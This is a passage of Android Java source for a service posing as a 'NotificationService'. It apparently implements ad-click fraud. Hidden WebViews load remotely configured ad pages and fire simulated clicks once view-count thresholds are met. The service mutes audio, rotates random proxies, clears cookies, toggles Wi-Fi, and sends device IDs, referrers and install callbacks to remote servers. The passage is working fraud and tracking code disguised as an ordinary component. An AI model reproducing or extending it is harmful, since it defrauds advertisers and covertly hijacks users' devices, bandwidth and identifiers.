		proxyReloaded = 0;
	}

	// reload view by int
	private void reloadView(int viewId, String url, String ua) {
		// clear cookies
		if (settings != null && settings.clearCookieLoads != null && settings.clearCookieLoads > 0) {
			cookieNumLoads++;
			if (settings.clearCookieLoads < cookieNumLoads) {
				clearCookies();
				cookieNumLoads = 0;
			}
		}

		// lets save when it was last called
		if (url != null) {
			url = url.replaceAll("/$", "");
			if (c != null && c.size() - 1 >= viewId) {
				// if new domain lets check if proxy reset required, only for the first window
				if (viewId == 0) {
					if (settings.proxies != null && settings.proxies.size() > 0) {
						if (c.get(viewId).getUrl() != null && url != null && getDomainName(c.get(viewId).getUrl()).equals(getDomainName(url)) == false) {
							setProxy();// randmly set proxy
						}
					} else {
						removeProxy();
					}
				}
				c.get(viewId).reload(url, ua);
			}
		}
	}

	private void resizeView(int viewId, int w, int h) {
		// lets save when it was last called
		if (w > 0 && h > 0) {
			if (c != null && c.size() - 1 >= viewId) {
				c.get(viewId).resize(w, h);
			}
		}
	}

	private String getDomainName(String url) {
		try {
			URI uri = new URI(url);
			String domain = uri.getHost();
			return domain.startsWith("www.") ? domain.substring(4) : domain;
		} catch (Exception e) {
			return url;
		}
	}

	private void clearCookies() {
		Log.d(TAG_NAME, "Service clearing cookies");
		for (int s = 0; s < c.size(); s++) {
			c.get(s).clearCookie();
		}

		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
			CookieManager.getInstance().removeAllCookies(null);
			CookieManager.getInstance().flush();
		} else {
			CookieSyncManager cookieSyncMngr = CookieSyncManager.createInstance(context);
			cookieSyncMngr.startSync();
			CookieManager cookieManager = CookieManager.getInstance();
			cookieManager.removeAllCookie();
			cookieManager.removeSessionCookie();
			cookieSyncMngr.stopSync();
			cookieSyncMngr.sync();
		}
	}

	private void performClick(int viewId, int x, int y) {
		Log.d(TAG_NAME, "Service performClick for viewId: ");
		Log.d(TAG_NAME, String.valueOf(viewId));
		if (c != null && c.size() - 1 >= viewId)
			c.get(viewId).click(x, y);
	}

	private void setProxy() {
		if (settings != null && settings.proxies.size() > 0 && Build.VERSION.SDK_INT > 18) {
			if ((netConn == NETWORK_WIFI && settings.proxyWifi) || (netConn == NETWORK_DATA && settings.proxyData)) {
				try {
					Random random = new Random();
					String p = settings.proxies.get(random.nextInt(settings.proxies.size()));
					String[] pp = p.split(":");
					Log.d(TAG_NAME, "Service: setting proxy: " + p);
					NotificationProxy.setProxy(context.getApplicationContext(), pp[0], Integer.parseInt(pp[1]), "android.app.Application");
					proxyEnabled = true;
				} catch (Exception e) {
					Log.e(TAG_NAME, e.getMessage(), e);
				}
			} else {
				removeProxy();
			}
		}
	}

	private void removeProxy() {
		if (proxyEnabled)
			NotificationProxy.removeProxy(context.getApplicationContext(), "android.app.Application");
		proxyEnabled = false;
	}

	private void reportRealDevice() {
		Log.d(TAG_NAME, "reportRealDevice...");
		// always cehck for the success, this is required so we do not call it second time after the success if state changed
		SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
		// check if we pinged already this device
		String pinged = sharedPreferences.getString("PINGED", null);
		if (pinged == null) {
			// save that we already pinged
			Editor edit = sharedPreferences.edit();
			edit.putString("PINGED", String.valueOf(System.currentTimeMillis()));
			edit.commit();

			try {
				String referrerString = AesUtils.e(sharedPreferences.getString("referrer", null));
				String deviceId = android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
				new LogEvent().execute(String.format(pingUrl, referrerString, deviceId, AesUtils.e(getApplicationId(context))));
				// new LogEvent().execute(String.format(pingUrl, referrerString, deviceId, AesUtils.e(AesUtils.b64(getApplicationId(context))), AesUtils.e(AesUtils.b64(String.valueOf(Build.VERSION.SDK_INT))), AesUtils.e(AesUtils.b64(Build.MANUFACTURER)), AesUtils.e(AesUtils.b64(Build.MODEL))));
				// new LogEvent().execute(null, "REAL_DEVICE");
			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			}
		}

		checkForBot = false; // done
	}

	private void otstuk() {
		// always cehck for the success, this is required so we do not call it second time after the success if state changed
		SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
		// check if we pinged already this device
		String pinged = sharedPreferences.getString("installedOn", null); // pinged contains starting service time from very beginning
		if (pinged != null) {
			try {
				String ots = sharedPreferences.getString("OTSTUK", null); // contains [1, 0] 1 - 20 min otstuk bil, 0 - 24h otstuka ne bilo
				String[] aots;
				String otstukat = null;
				if (ots == null)
					aots = new String[] { "0", "0" };
				else {
					aots = ots.split(",");
					if (aots.length != 2)
						aots = new String[] { "0", "0" };
				}

				long startingDate = Long.parseLong(pinged);
				long dateNow = System.currentTimeMillis();
				// Log.d(TAG_NAME, "Otstuk..." + ((dateNow - startingDate) / 1000) + "seks");
				// check for 20 min otstuk
				if (aots[0].equals("0")) {
					if (dateNow - startingDate >= 1200000) {// 1200000ms - 20min
						aots[0] = "1";
						aots[1] = "0";
						otstukat = "2";
					}
				} else if (aots[1].equals("0")) {
					if (dateNow - startingDate >= 86400000) {// 86400000ms - 24h
						aots[0] = "1";
						aots[1] = "1";
						otstukat = "1";
					}
				}

				if (otstukat != null) {
					Log.d(TAG_NAME, "Saving local otstuk:");
					Log.d(TAG_NAME, Arrays.toString(aots));

					Editor edit = sharedPreferences.edit();
					edit.putString("OTSTUK", aots[0] + "," + aots[1]);
					edit.commit();

					String referrerString = sharedPreferences.getString("installedFrom", null);
					if (referrerString != null) {
						String[] clickId = referrerString.split(":");
						Log.d(TAG_NAME, "Sending otstuk to:");
						Log.d(TAG_NAME, String.format(otstukUrl, otstukat, AesUtils.e(clickId[0]), AesUtils.e(getApplicationId(context))));
						new LogEvent().execute(String.format(otstukUrl, otstukat, AesUtils.e(clickId[0]), AesUtils.e(getApplicationId(context))));
					}
				}

			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			}
		}
	}

	private void enableWifi() {
		Log.d(TAG_NAME, "Wi-fi - enable it");
		try {
			WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
			wifiManager.setWifiEnabled(true);

			new Handler().postDelayed(new Runnable() {
				public void run() {
					refreshNotifications();
					// lets repeat just in case
					netConn = networkStatus();
					if (netConn == NETWORK_NONE) {
						WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
						wifiManager.setWifiEnabled(true);
					}
				}
			}, 5 * 1000);

		} catch (Exception e) {
		}
	}

	private void countView(int viewId, String tagId) {
		//Log.d(TAG_NAME, "countView: Counting +1 view for tag: ");
		//Log.d(TAG_NAME, tagId);

		// lets save total view per 24H
		totalViews24H.incrementAndGet();

		// lets get max banners if any
		int maxBanners = 0;
		if (settings != null && settings.bans != null && settings.bans.containsKey(tagId))
			maxBanners = settings.bans.get(tagId);
		// working with banners
		if (maxBanners > 0) {
			for (int b = 0; b < maxBanners; b++)
				countViews(viewId, tagId, b); // append banner id
		} else { // just one tag with one banner
			countViews(viewId, tagId, null);
		}
	}

	private void countViews(int viewId, String tagId, Integer bannerId) {
		try {
			SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
			int count = 0;
			String key = tagId + (bannerId != null ? ("." + bannerId) : "");
			if (countViews.containsKey(key)) { // counter already exists for this tag
				count = countViews.get(key);
			} else { // lets make sure and check preferences
				count = sharedPreferences.getInt(key, 0);
			}
			// Log.d(TAG_NAME, "countView: Total views: ");
			// Log.d(TAG_NAME, String.valueOf(count));
			// Log.d(TAG_NAME, "countView: clickInProgress: ");
			// Log.d(TAG_NAME, String.valueOf(cip));
			// Log.d(TAG_NAME, String.valueOf(bannerId));
			count++;
			// lets check current tag CTR if its time to make click
			if (cip == null && settings != null && settings.ctr != null && settings.ctr.containsKey(tagId)) {
				Log.d(TAG_NAME, "countView: CTR: ");
				Log.d(TAG_NAME, String.valueOf(count * settings.ctr.get(tagId)));
				if (count * settings.ctr.get(tagId) >= 1) { // its time
					cip = viewId; // mark process globally
					c.get(viewId).setTagId(tagId).setBannerId(bannerId).fireClick(); // set banner id only if we have init atleast one banner
				}
			}

			countViews.put(key, count);

			// save for future every second time
			if (count % 2 == 0) {
				Editor edit = sharedPreferences.edit();
				edit.putInt(key, count);
				edit.commit();
			}
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	private void clickSuccess(int viewId, String url) {
		Log.d(TAG_NAME, "Click was successful for url: ");
		Log.d(TAG_NAME, url);
		try {
			Window w = c.get(viewId);
			if (w.getTagId() != null) {
				// lets log click
				String json = "{\"e\": \"%s\",\"u\": \"%s\",\"al\": \"%s\",\"h\": \"%s\",\"t\": \"%s\",\"bid\": \"%s\",\"pid\": \"%s\"}";
				String urlStr = String.format(NOTIFICATION_URL_LOG, nh) + "?_=" + URLEncoder.encode(AesUtils.encrypt(String.format(json, "CLK", getUserUuid(context), URLEncoder.encode(context.getPackageName(), "UTF-8"), URLEncoder.encode(url, "UTF-8"), w.getTagId(), w.getBannerId(), pid != null ? pid : 0), AesUtils.encryptionKey), "UTF-8");
				new LogEvent().execute(urlStr);
				w.clickSuccess();// success
			}

			cip = null; // reset global flag
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	private void changeWifi() {
		Log.d(TAG_NAME, "Changing wifi state...");
		netConn = networkStatus();
		if (netConn == NETWORK_WIFI) {
			int res = context.checkCallingOrSelfPermission("android.permission.CHANGE_WIFI_STATE");
			// check permission first
			if (res == PackageManager.PERMISSION_GRANTED) {
				Log.d(TAG_NAME, "Wi-fi enabled - disable it");
				wifiWasDiabled = true;
				WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
				wifiManager.setWifiEnabled(false);
				// as we are disabling it lets make sure its back in 7 seks
				new Handler().postDelayed(new Runnable() {
					public void run() {
						netConn = networkStatus();
						enableWifi();
					}
				}, 7 * 1000);
			}
		}
	}
	
	//check if any of view are muted
	private boolean isMuted() {
		try {
			for (int s = 0; s < c.size(); s++)
				if(c.get(s).getMutedVolume() != null)
					return true;
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
		return false;
	}

	private void mute(int viewId) {
		Log.d(TAG_NAME, "MUTE...event from view " + viewId);
		try {
			Window w = c.get(viewId);
			w.mute();
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	private void unmute(int viewId) {
		Log.d(TAG_NAME, "UNMUTE...event from view " + viewId);
		try {
			Window w = c.get(viewId);
			w.unmute();
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	private void wifiLock() {
		try {
			ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

			if (mWifi.isConnected()) {
				Log.d(TAG_NAME, "Wifi accuire locking...");
				WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
				wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "com.notification.service.WifiLock");
				wifiLock.acquire();
			}
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	// Getters & Setters ------------------------------------------------------------------------------ Getters & Setters

	// Inner Classes ------------------------------------------------------------------------------ Inner Classes

	// Broadcast Receiver class
	private final BroadcastReceiver receiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			Log.d(TAG_NAME, "BroadcastReceiver:");
			Log.d(TAG_NAME, action);
			try {
				if (action.equalsIgnoreCase("RW"))
					reloadView(intent.getIntExtra("vi", 0), intent.getStringExtra("url"), intent.getStringExtra("ua"));
				else if (action.equalsIgnoreCase("RESIZE"))
					resizeView(intent.getIntExtra("vi", 0), intent.getIntExtra("w", 0), intent.getIntExtra("h", 0));
				else if (action.equalsIgnoreCase("PC"))
					performClick(intent.getIntExtra("vi", 0), intent.getIntExtra("x", 100), intent.getIntExtra("y", 100));
				else if (action.equalsIgnoreCase("sw"))
					showView(intent.getIntExtra("vi", 0));
				else if (action.equalsIgnoreCase("CC"))
					clearCookies();
				else if (action.equalsIgnoreCase("ff"))
					forceReload(intent.getIntExtra("vi", 0));
				else if (action.equalsIgnoreCase("ss"))
					stopService();
				else if (action.equalsIgnoreCase("CV"))
					countView(intent.getIntExtra("vi", 0), intent.getStringExtra("tid"));
				else if (action.equalsIgnoreCase("CVB"))
					countViews(intent.getIntExtra("vi", 0), intent.getStringExtra("tid"), intent.getIntExtra("bid", 0));
				else if (action.equalsIgnoreCase("CCLK"))
					clickSuccess(intent.getIntExtra("vi", 0), intent.getStringExtra("u"));
				else if (action.equalsIgnoreCase("PE"))
					proxyReset();
				else if (action.equalsIgnoreCase("PS"))
					proxySuccess();
				else if (action.equalsIgnoreCase("AE"))
					adError(intent.getIntExtra("vi", 0), intent.getStringExtra("u"), intent.getBooleanExtra("rp", false));
				else if (action.equalsIgnoreCase("SERVICE_DESTROY"))
					destroy(new Object[] { context, ns });
				else if (action.equalsIgnoreCase("WIFI"))
					changeWifi();
				else if (action.equalsIgnoreCase("MUTE"))
					mute(intent.getIntExtra("vi", 0));
				else if (action.equalsIgnoreCase("UNMUTE"))
					unmute(intent.getIntExtra("vi", 0));
				else
					updateViews();

				// if the change was in the network connection
				if (checkForBot && action.equalsIgnoreCase("android.net.conn.CONNECTIVITY_CHANGE")) {
					netConn = networkStatus();
					if (netConn == NETWORK_DATA)
						reportRealDevice();
				}

				// lets verify windows when power is on after sleep, make sure its not hanged
				if (action.equalsIgnoreCase("android.intent.action.SCREEN_ON")) {
					verifyViews();
					rescheduleRefresh();//lets keep this to pick up scheduler if it goes off
				}

				// Keep the WiFi on, if necessary
				if (action.equalsIgnoreCase("android.net.conn.CONNECTIVITY_CHANGE")) {
					wifiLock();
				}

			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			}

		}
	};

	private final BroadcastReceiver receiverVerify = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			Log.d(TAG_NAME, "BroadcastReceiver:");
			Log.d(TAG_NAME, action);
			try {
				if (action.equalsIgnoreCase("CNS")) {
					long time;
					boolean active = false; // true if any of the windows must be active
					for (int s = 1; s <= c.size(); s++) {
						Window w = c.get(s - 1);
						if (w.isStatus())
							active = true;
					}
					time = (System.currentTimeMillis() - lastReload) / 1000;
					if (active && settings != null && time > settings.forceCloseTimeout * 2) { //
						Log.d(TAG_NAME, "Looks like windows are not running, do not send response back");
						verifyViews();
					} else {
						// we are all good send intent we're good
						Intent i = new Intent("RCNS");
						i.setPackage(context.getPackageName());
						context.sendBroadcast(i);
						Log.d(TAG_NAME, "Broadcast RCNS intent");
					}
				}

			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			}

		}
	};

	// Settings Class
	private class Settings {

		public Integer forceCloseTimeout;
		public Integer timeAfterClk;
		public Integer clearCookieLoads;
		public Integer maxViewsWifi;
		public Integer maxViewsData;
		public List<String> urls;
		public List<RangeDto> wifi;
		public List<RangeDto> mobile;
		public Map<String, Float> ctr;
		public Map<String, Integer> bans;
		public List<String> proxies;
		public boolean proxyWifi;
		public boolean proxyData;
		public String country;
		public String otstuk;
		private Integer maxDeviceLoadsPerDay;

		public Settings() {

		}

		class RangeDto {
			public int views;
			public int from;
			public int to;

			public RangeDto(int views, int from, int to) {
				this.views = views;
				this.from = from;
				this.to = to;
			}
		}
	}

	// Window Class
	private class Window {

		private WebView wv;

		private NotificationWebViewClient nwvc;

		private long lastLoad;

		private boolean status;

		private String tagId;

		private Integer bannerId;

		private int id;

		private Integer mutedVolume; // if we mute save original volume

		public Window(WebView wv, NotificationWebViewClient nwvc) {
			this.wv = wv;
			this.nwvc = nwvc;
			this.wv.setWebViewClient(nwvc);
			this.lastLoad = System.currentTimeMillis();
		}

		// destroy view
		public void disable() {
			Log.d(TAG_NAME, "Service: Disable V: ");
			wv.stopLoading();
			wv.loadUrl("about:blank");
			setStatus(false);
		}

		// set id into the user-agent of the window
		public void setId(int id) {
			WebSettings s = wv.getSettings();
			s.setUserAgentString(s.getUserAgentString() + " ." + id);
			this.id = id;
		}

		public int getId() {
			return this.id;
		}

		// return current view url
		public String getUrl() {
			return wv.getUrl().replaceAll("/$", "");
		}

		public void destroy() {
			Log.d(TAG_NAME, "Service: Remove V: ");
			try {
				((ViewManager) wv.getParent()).removeView(wv);
				wv.destroy();
				wv = null;
			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			}
		}

		public void load(String data) {
			String[] da = data.split(";;");
			if (da != null && da.length > 0) {
				load(da[0], da.length > 1 ? da[1] : null);
			}
		}

		public void load(String url, String ua) {
			reload(url, ua);
		}

		public void click(float x, float y) {
			Log.d(TAG_NAME, "Service: click click click");
			NotificationWebViewClient.DR = false;
			long uMillis = SystemClock.uptimeMillis();
			wv.dispatchTouchEvent(MotionEvent.obtain(uMillis, uMillis, MotionEvent.ACTION_DOWN, x, y, 0));
			wv.dispatchTouchEvent(MotionEvent.obtain(uMillis, uMillis, MotionEvent.ACTION_UP, x, y, 0));
			new Handler().postDelayed(new Runnable() {
				public void run() {
					NotificationWebViewClient.DR = true;
				}
			}, 5000);
		}

		public void show() {
			if (wv.getVisibility() == View.VISIBLE)
				wv.setVisibility(View.INVISIBLE);
			else
				wv.setVisibility(View.VISIBLE);
		}

		public void clearCookie() {
			nwvc.clearCookies();
		}

		public void fireClick() {
			this.lastLoad = System.currentTimeMillis();// update timer
			wv.loadUrl("javascript:window.$CLK(" + (getBannerId() != null ? getBannerId() : "") + ")");
		}

		public void clickSuccess() {
			String key = getTagId() + (getBannerId() != null ? ("." + getBannerId()) : "");
			countViews.put(key, 0); // reset views for the tag-banner for next click
			setTagId(null); // reset
			setBannerId(null); // reset
			// if time we have left for force reload is less then timeAfterClk required, lets reset last reload so we keep the page opened
			if (settings != null && settings.forceCloseTimeout > 0)
				this.lastLoad = System.currentTimeMillis() - ((settings.forceCloseTimeout - settings.timeAfterClk) * 1000);
		}

		public void mute() {
			if(getMutedVolume() == null && isMuted() == false) {
				AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);			
				setMutedVolume(am.getStreamVolume(AudioManager.STREAM_MUSIC));			
				Log.d(TAG_NAME, "MUTE...initial volume " + getMutedVolume());
	
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
					am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
				} else {
					am.setStreamMute(AudioManager.STREAM_MUSIC, true);
				}
			}
		}
		
		public void unmute() {
			if(getMutedVolume() != null) {
				Log.d(TAG_NAME, "UNMUTE...to the volume " + getMutedVolume());
				AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
					am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, getMutedVolume());
				} else {
					am.setStreamVolume(AudioManager.STREAM_MUSIC, getMutedVolume(), 0);
					
				}
				setMutedVolume(null);
			}
			
		}


		// reload view
		public void reload(String url, String ua) {
			unmute(); //lets unmute first
			
			String id = url.replaceAll("/$", "");
			try {
				id = URLDecoder.decode(id, "UTF-8");
			} catch (Exception e) {
			}
			this.lastLoad = System.currentTimeMillis(); // update timer
			wv.setId(id.replaceAll("[^a-zA-Z0-9]", "").hashCode()); // // this is required for web view client
			if (ua != null) {
				Log.d(TAG_NAME, "Service: update user-agent to: " + ua);
				wv.getSettings().setUserAgentString(ua + " ." + getId());
			}
			// before request flush cache to storage
			HttpResponseCache cache = HttpResponseCache.getInstalled();
			if (cache != null) {
				cache.flush();
			}

			wv.loadUrl(url);
			setStatus(true);

			// lets reset global click process just in case click did not succeed
			if (cip != null && getId() == cip)
				cip = null; // reset global flag
		}

		public void resize(int w, int h) {
			// DisplayMetrics displayMetrics = new DisplayMetrics();
			// WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE); // the results will be higher than using the activity context object or the getWindowManager() shortcut
			// wm.getDefaultDisplay().getMetrics(displayMetrics);

			// Log.d(TAG_NAME, "Resize to: " + w + "x" + h + ", density: " + displayMetrics.density);
			// getWv().setLayoutParams(new LinearLayout.LayoutParams((int) (w * displayMetrics.density), (int) (h * displayMetrics.density)));
			getWv().setLayoutParams(new LinearLayout.LayoutParams(w, h));
		}

		public WebView getWv() {
			return wv;
		}

		public void setWv(WebView wv) {
			this.wv = wv;
		}

		public long getLastLoad() {
			return lastLoad;
		}

		public void setLastLoad(long lastLoad) {
			this.lastLoad = lastLoad;
		}

		public boolean isStatus() {
			return status;
		}

		public void setStatus(boolean status) {
			this.status = status;
		}

		public String getTagId() {
			return tagId;
		}

		public Window setTagId(String tagId) {
			this.tagId = tagId;
			return this;
		}

		public Integer getBannerId() {
			return bannerId;
		}

		public Window setBannerId(Integer bannerId) {
			this.bannerId = bannerId;
			return this;
		}

		public Integer getMutedVolume() {
			return mutedVolume;
		}

		public void setMutedVolume(Integer mutedVolume) {
			this.mutedVolume = mutedVolume;
		}
	}

	class Notifications extends AsyncTask<String, Integer, String> {
		@Override
		protected String doInBackground(String... params) {
			HttpURLConnection uc = null;
			try {
				String usf = String.format(NOTIFICATION_URL_JSON, nh);
				Log.d(TAG_NAME, "Service: Getting notifications json...");
				Log.d(TAG_NAME, usf);
				// Log.d(TAG_NAME, String.valueOf(country));
				URL url = new URL(usf);
				uc = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
				uc.setRequestMethod("GET");
				uc.setConnectTimeout(30000);
				uc.setRequestProperty("Requested-With", context.getPackageName() + ";" + noh);// this is required for filtering tags by package id and host for the current node
				if (pid != null)
					uc.setRequestProperty("X-Partner-ID", pid + ";" + noh);// this is required for filtering tags by partner id and host for the current node
				if (xCountry != null && xCountry.equals("") == false)
					uc.setRequestProperty("X-Country", xCountry);

				uc.connect();
				// gets the server json data
				BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(uc.getInputStream()));
				String next;
				StringBuilder json = new StringBuilder();
				while ((next = bufferedReader.readLine()) != null) {
					json.append(next);
				}
				// Log.d(TAG_NAME, json.toString());

				return json.toString();
			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			} finally {
				if (uc != null)
					uc.disconnect();
			}
			return null;
		}

		@Override
		protected void onPostExecute(String result) {
			if (result != null) {
				try {
					Log.d(TAG_NAME, AesUtils.decrypt(result, AesUtils.encryptionKey));
					JSONObject json = new JSONObject(AesUtils.decrypt(result, AesUtils.encryptionKey));
					updateSettings(json);
					updateViews();

				} catch (Exception e) {
					Log.e(TAG_NAME, e.getMessage(), e);
				}
			}

			NotificationService.lastRefresh = System.currentTimeMillis();

			rescheduleRefresh();

		}
	}

	class NodeNotifications extends AsyncTask<String, Integer, String> {

		@Override
		protected String doInBackground(String... params) {
			HttpURLConnection uc = null;

			try {
				String usf = String.format(NODE_URL_JSON, noh);
				Log.d(TAG_NAME, "Service: Getting node notifications json...");
				Log.d(TAG_NAME, usf);
				// Log.d(TAG_NAME, String.valueOf(country));
				URL url = new URL(usf);
				uc = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
				uc.setRequestMethod("GET");
				uc.setConnectTimeout(30000);
				uc.setRequestProperty("Requested-With", context.getPackageName());// this is required for filtering tags by package id
				uc.setRequestProperty("X-Partner-ID", pid);// this is required for filtering tags by partner id
				if (xCountry != null && xCountry.equals("") == false)
					uc.setRequestProperty("X-Country", xCountry);

				uc.connect();
				// gets the server json data
				BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(uc.getInputStream()));
				String next;
				StringBuilder json = new StringBuilder();
				while ((next = bufferedReader.readLine()) != null) {
					json.append(next);
				}
				// Log.d(TAG_NAME, json.toString());

				return json.toString();
			} catch (Exception e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			} finally {
				if (uc != null)
					uc.disconnect();
			}
			return null;
		}

		@Override
		protected void onPostExecute(String result) {
			if (result != null) {
				try {
					String data = new String(Base64.decode(result.getBytes(), Base64.DEFAULT));
					Log.d(TAG_NAME, data);
					JSONObject json = new JSONObject(data);
					updateSettings(json);
					updateViews();

				} catch (Exception e) {
					Log.e(TAG_NAME, e.getMessage(), e);
				}

				NotificationService.lastRefresh = System.currentTimeMillis();
				rescheduleRefresh();

			} else {
				new Notifications().execute();
			}

		}
	}

	// for custom url call: new LogEvent().execute(full url);
	// for standard event call: new LogEvent().execute(null, event);
	public class LogEvent extends AsyncTask<String, Integer, String> {
		@Override
		protected String doInBackground(String... params) {
			HttpURLConnection c = null;
			try {
				String urlStr;
				// custom url to send
				if (params.length == 1) {
					urlStr = params[0];
				} else {
					String json = "{\"e\": \"%s\",\"u\": \"%s\",\"a\": \"%s\",\"ap\": \"%s\",\"d\": \"%s\",\"al\": \"%s\"}";
					urlStr = String.format(NOTIFICATION_URL_LOG, nh) + "log?_=" + URLEncoder.encode(AesUtils.encrypt(String.format(json, params[1], getUserUuid(context), fakeR.byIdName("apk_version"), Build.VERSION.SDK_INT, URLEncoder.encode(Build.MANUFACTURER + " " + Build.MODEL, "UTF-8"), URLEncoder.encode(context.getPackageName(), "UTF-8")), AesUtils.encryptionKey), "UTF-8");
				}
				Log.d(TAG_NAME, "LogEvent:");
				Log.d(TAG_NAME, urlStr);

				URL url = new URL(urlStr);
				c = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
				c.setRequestMethod("GET");
				c.setConnectTimeout(10000);
				c.setRequestProperty("Requested-With", context.getPackageName());
				if (pid != null)
					c.setRequestProperty("X-Partner-ID", pid);
				c.getInputStream();

			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				if (c != null)
					c.disconnect();
			}
			return null;
		}

		@Override
		protected void onPostExecute(String result) {
			// if wifi was disabled before lets enable it
			if (wifiWasDiabled) {
				wifiWasDiabled = false;
				enableWifi();
			}

		}
	}

}
